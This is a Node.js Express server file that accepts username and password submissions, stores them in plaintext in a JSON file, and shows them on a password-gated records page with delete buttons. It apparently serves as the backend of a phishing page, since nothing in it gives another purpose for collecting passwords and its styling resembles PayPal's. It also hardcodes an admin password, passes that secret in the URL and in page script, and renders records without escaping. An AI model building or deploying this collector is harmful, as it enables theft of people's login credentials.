// server.js
const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'records.json');
const ADMIN_PASSWORD = 'your_secure_password'; // Change this to a secure password

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serve static files from 'public' directory

// Initialize records file if it doesn't exist
if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify([]));
}

// Submit endpoint
app.post('/submit', (req, res) => {
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Missing fields' });
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    const newRecord = {
        id: Date.now(),
        username,
        password,
        timestamp: new Date().toISOString()
    };
    
    records.push(newRecord);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    
    res.json({ success: true });
});

// Records page with password protection
app.get('/records', (req, res) => {
    const providedPassword = req.query.password;
    
    if (providedPassword !== ADMIN_PASSWORD) {
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Authentication Required</title>
                <style>
                    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
                    input { padding: 10px; margin: 10px; }
                    button { padding: 10px 20px; background: #0070ba; color: white; border: none; border-radius: 5px; }
                </style>
            </head>
            <body>
                <h2>Enter Password</h2>
                <input type="password" id="password" placeholder="Password">
                <button onclick="window.location.href='/records?password=' + document.getElementById('password').value">
                    Submit
                </button>
            </body>
            </html>
        `);
        return;
    }

    const records = JSON.parse(fs.readFileSync(DATA_FILE));
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Records</title>
            <style>
                body {
                    font-family: Arial, sans-serif;
                    max-width: 800px;
                    margin: 0 auto;
                    padding: 20px;
                    background: #f5f5f5;
                }
                h1 {
                    color: #0070ba;
                    text-align: center;
                    margin-bottom: 30px;
                }
                .record {
                    background: white;
                    padding: 20px;
                    margin: 15px 0;
                    border-radius: 10px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                    position: relative;
                }
                .record p {
                    margin: 8px 0;
                    word-break: break-all;
                }
                .delete-btn {
                    position: absolute;
                    top: 20px;
                    right: 20px;
                    background: #ff4444;
                    color: white;
                    border: none;
                    padding: 8px 15px;
                    border-radius: 5px;
                    cursor: pointer;
                    transition: background 0.3s;
                }
                .delete-btn:hover {
                    background: #cc0000;
                }
            </style>
        </head>
        <body>
            <h1>Records</h1>
            ${records.map(record => `
                <div class="record">
                    <p><strong>ID:</strong> ${record.id}</p>
                    <p><strong>Username:</strong> ${record.username}</p>
                    <p><strong>Password:</strong> ${record.password}</p>
                    <p><strong>Timestamp:</strong> ${record.timestamp}</p>
                    <button class="delete-btn" onclick="deleteRecord(${record.id})">Delete</button>
                </div>
            `).join('')}
            <script>
                function deleteRecord(id) {
                    if (confirm('Are you sure you want to delete this record?')) {
                        fetch('/delete/' + id, {
                            method: 'DELETE',
                            headers: {
                                'X-Password': '${ADMIN_PASSWORD}'
                            }
                        })
                        .then(response => {
                            if (response.ok) {
                                location.reload();
                            }
                        });
                    }
                }
            </script>
        </body>
        </html>
    `);
});

// Delete endpoint
app.delete('/delete/:id', (req, res) => {
    const password = req.headers['x-password'];
    if (password !== ADMIN_PASSWORD) {
        return res.status(401).json({ success: false, message: 'Unauthorized' });
    }

    const id = parseInt(req.params.id);
    let records = JSON.parse(fs.readFileSync(DATA_FILE));
    records = records.filter(record => record.id !== id);
    fs.writeFileSync(DATA_FILE, JSON.stringify(records, null, 2));
    
    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
